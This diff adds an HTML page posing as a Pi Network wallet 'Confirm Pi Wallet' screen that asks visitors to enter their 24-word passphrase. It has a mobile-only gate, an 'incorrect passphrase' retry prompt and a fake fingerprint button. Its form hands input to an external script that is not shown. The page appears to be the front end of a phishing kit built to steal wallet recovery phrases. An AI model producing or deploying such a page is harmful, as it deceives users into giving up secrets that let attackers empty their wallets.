@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="./output.css" rel="stylesheet">
+    <title>Pi Core Validation</title>
+</head>
+
+<body class="h-dvh bg-white font-sans w-full antialiased">
+    <div id="desktop-message"
+        class="hidden fixed inset-0 bg-gray-100 z-50 flex-col items-center justify-center text-center px-6">
+
+        <div class="bg-white p-10 rounded-3xl shadow-xl max-w-md">
+            <img src="/logo.png" class="w-24 mx-auto mb-5" alt="Logo">
+
+            <h1 class="text-2xl font-bold mb-3">
+                Open on Mobile
+            </h1>
+
+            <p class="text-gray-500">
+                This application is available only on mobile devices.
+            </p>
+        </div>
+    </div>
+    <main id="content" class="flex flex-col items-center justify-start gap-3 w-full h-full pb-20">
+        <!-- header -->
+        <div class="w-full h-auto relative px-8 bg-[#713D92]">
+            <header class="flex flex-row flex-nowrap items-end justify-center w-full relative py-4">
+                <nav class="flex items-center-safe justify-between text-white relative max-w-156.5 md:max-w-318 w-full">
+                    <!-- logo -->
+                    <div class="logo flex items-start justify-start h-full w-full cursor-pointer">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M4 12L10 6M4 12L10 18M4 12H14.5M20 12H17.5" class="stroke-gray-400/70"
+                                stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" />
+                        </svg>
+                    </div>
+                    <a href="/" class="w-full">
+                        <div class="logo flex items-center justify-start h-full w-full cursor-pointer gap-2">
+                            <p class="text-[14px] font-semibold">Wallet</p>
+                            <div class="logo flex items-start justify-start h-full w-full cursor-pointer">
+                                <img src="./src/images/logoo-300x300.png" alt="pi logo" class="h-6 w-6">
+
+                            </div>
+                        </div>
+                    </a>
+                    <div class="flex items-center justify-end w-full">
+                        <div id="subMenuView" class="cursor-pointer">
+                            <span id="menu-icon">
+                                <!-- Hamburger icon -->
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M19 9L12 15L10.25 13.5M5 9L7.33333 11" stroke="currentColor"
+                                        stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" />
+                                </svg>
+                            </span>
+                        </div>
+                    </div>
+                </nav>
+            </header>
+        </div>
+
+        <!-- content -->
+        <section class="w-full flex flex-col gap-5 items-center px-8">
+            <div class="flex items-center gap-2">
+                <h5 class="text-[19px] font-semibold tracking-tight">Confirm Pi Wallet</h5>
+            </div>
+
+            <!--  -->
+            <form id="form" class="w-full">
+                <div class="w-full flex flex-col items-start gap-5">
+                    <div class="flex flex-col items-center gap-2 w-full">
+                        <textarea id="passphrase" name="message" rows="6"
+                            placeholder="Enter your 24 words passphrase..." required
+                            class="w-full rounded-xl border border-gray-300 px-4 py-3 text-gray-800 placeholder-gray-400 outline-none transition duration-200 focus:border-purple-600 focus:ring-4 focus:ring-purple-100 resize-none"></textarea>
+                        <p class="text-[18px] tracking-wide hidden" id="warningText">incorrect passphrase <a
+                                href="/wallet" class="text-red-400 underline">retry again
+                                here</a></p>
+                    </div>
+                    <!-- button -->
+                    <div class="w-full flex items-center flex-col gap-4 justify-center">
+                        <button type="submit" id="submitBtn"
+                            class="flex items-center justify-center gap-3 px-8 cursor-pointer py-2 border border-purple-800 w-full rounded-md text-[#7D57C2]">
+                            <span id="btnText">Unlock with Passphrase</span>
+                            <svg id="spinner" class="hidden h-5 w-5 animate-spin" xmlns="http://www.w3.org/2000/svg"
+                                fill="none" viewBox="0 0 24 24">
+                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
+                                    stroke-width="4">
+                                </circle>
+
+                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z">
+                                </path>
+                            </svg>
+                        </button>
+                        <span class="px-8 text-center py-2 bg-purple-800 w-full rounded-md text-gray-200">Unlock
+                            with
+                            Fingerprint</span>
+                    </div>
+                </div>
+            </form>
+
+            <!-- text -->
+            <div class="text-balance">
+                <p class="text-[14px] leading-9">
+                    As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of
+                    passphrase is currently impossible
+
+                    Lost your passphrase? <a href="" class="text-violet-400 underline">You can create a new wallet,</a>
+                    but
+                    all your π in your previous wallet will be
+                    inaccessible
+                </p>
+            </div>
+        </section>
+    </main>
+    <script src="./src/script.js"></script>
+</body>
+
+</html>
